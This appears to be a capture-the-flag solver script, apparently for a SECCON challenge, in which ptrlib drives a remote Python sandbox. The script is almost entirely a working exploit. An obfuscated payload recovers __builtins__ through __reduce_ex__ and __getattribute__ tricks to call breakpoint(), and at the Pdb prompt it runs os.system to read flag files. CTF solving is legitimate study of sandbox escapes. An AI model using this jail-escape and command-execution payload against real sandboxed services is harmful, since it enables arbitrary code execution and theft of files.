import ptrlib
import os

io = ptrlib.Socket(
    os.getenv("SECCON_HOST", "localhost"),
    int(os.getenv("SECCON_PORT", 5000)),
)
io.debug = True

io.sendlineafter(
    "code> ",
    r'(__builtins__:=[].__reduce_ex__(-~(()==()))[()<()].__getattribute__("\u0000__builtins__"[()==():]))["\U00000062reakpoint"]()',
)

io.sendlineafter(
    "(Pdb) ",
    '__import__("os").system("cat /flag-*")',
)

print(io.recvline().decode().strip())
